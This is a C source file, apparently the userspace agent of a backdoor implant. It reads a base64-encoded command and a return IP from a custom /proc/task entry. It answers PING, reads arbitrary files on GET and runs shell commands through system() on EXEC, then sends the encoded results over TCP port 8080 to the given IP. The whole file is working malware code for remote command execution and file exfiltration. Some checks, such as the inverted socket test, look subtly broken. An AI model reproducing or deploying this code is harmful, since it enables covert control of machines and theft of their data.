#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include "base64.h"

#include "macros.h"

#define MAX_DATA_SIZE 64000  // a bit smaller than the maximum TCP/UDP payload sizes
#define TCP_RESPONSE_PORT 8080

#define IP4_LEN_MAX 16  // xxx.xxx.xxx.xxx\0

char *do_task(char *cmd_str)
{
    char *response = NULL;
    size_t response_len = 0;

    // PING
    if (0 == strncmp(cmd_str, "PING", 4))
    {
         response = base64_encode("PONG", 4, &response_len);
    }

    // GET
    if (0 == strncmp(cmd_str, "GET ", 4))
    {
        char *path = cmd_str + 4;
        FILE *getfile = fopen(path, "r");
        if (NULL != getfile)
        {
            size_t file_len = 0;
            char *file_buf = NULL;

            fseek(getfile, 0, SEEK_END);
            file_len = (size_t)(ftell(getfile));
            fseek(getfile, 0, SEEK_SET);

            file_buf = (char *)calloc(file_len, sizeof(char));
            if (file_buf)
            {
                if (file_len == fread(file_buf, 1, file_len, getfile))
                {
                    response = base64_encode(file_buf, file_len, &response_len);
                }
                free(file_buf);
            }
            fclose(getfile);
        }
    }

    // EXEC
    if (0 == strncmp(cmd_str, "EXEC ", 5))
    {
        char res_str[16] = {0};
        char *cmd = cmd_str + 5;
        
        int sys_ret = system(cmd);

        sprintf(res_str, "%d", sys_ret);
        response = base64_encode(res_str, strlen(res_str), &response_len);
    }

    return response;
}

int send_response(char *ip_str, char *response)
{
    int retval = -1;

    int sock = socket(AF_INET, SOCK_STREAM, 0);  // TCP over IPv4
    if (0 >= sock)
    {
        struct sockaddr_in saddr = {0};
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(TCP_RESPONSE_PORT);

        if (1 == inet_pton(AF_INET, ip_str, &saddr.sin_addr.s_addr))
        {
            if (0 == connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)))
            {
                size_t len = strlen(response);
                if (len == send(sock, response, strlen(response), 0))
                {
                    retval = 0;
                }
            }
        }
        close(sock);
    }

    return retval;
}

int main()
{
    int retval = 0;
    FILE *procfile = NULL;
    char *taskbuf = NULL;
    size_t tasklen = 0;
    char ip_str[IP4_LEN_MAX] = {0};
    char *b64_str = NULL;
    char *cmd_str = NULL;
    char *response = NULL;

    // allocate a buffer for the task
    taskbuf = (char *)calloc(MAX_DATA_SIZE, sizeof(char));
    if (NULL == taskbuf)
    {
        retval = -1;
        goto cleanup;
    }

    // retrieve the task
    procfile = fopen("/proc/task", "r");
    if (NULL == procfile)
    {
        retval = -2;
        goto cleanup;
    }
    tasklen = fread(taskbuf, sizeof(char), MAX_DATA_SIZE, procfile);
    if (0 == tasklen)
    {
        retval = -3;
        goto cleanup;
    }
    fclose(procfile);
    procfile = NULL;

    // split the message (IP;base64), account for size of ;
    b64_str = strchr(taskbuf, ';') + 1;
    if ((void *)1 == b64_str)
    {
        retval = -4;
        goto cleanup;
    }
    strncpy(ip_str, taskbuf, (size_t)(b64_str - taskbuf -1));

    // decode the task
    cmd_str = base64_decode(b64_str, strnlen(b64_str, MAX_DATA_SIZE - IP4_LEN_MAX - 1), &tasklen);
    if (NULL == cmd_str)
    {
        retval = -5;
        goto cleanup;
    }
    free(taskbuf);
    taskbuf = NULL;

    // handle the task
    response = do_task(cmd_str);
    if (NULL == response)
    {
        // something went wrong; report the error
        char errstr[25] = {0};
        sprintf(errstr, "ERROR: %d", errno);
        response = base64_encode(errstr, strlen(errstr), NULL);
        retval = -6;
    }
    free(cmd_str);
    cmd_str = NULL;

    // send the response
    if (0 != send_response(ip_str, response))
    {
        retval = -7;
        goto cleanup;
    }
    free(response);
    response = NULL;

cleanup:

    if (NULL != response)
    {
        free(response);
        response = NULL;
    }
    if (NULL != cmd_str)
    {
        free(cmd_str);
        cmd_str = NULL;
    }
    if (NULL != taskbuf)
    {
        free(taskbuf);
        taskbuf = NULL;
    }
    if (NULL != procfile)
    {
        fclose(procfile);
        procfile = NULL;
    }

    return retval;
}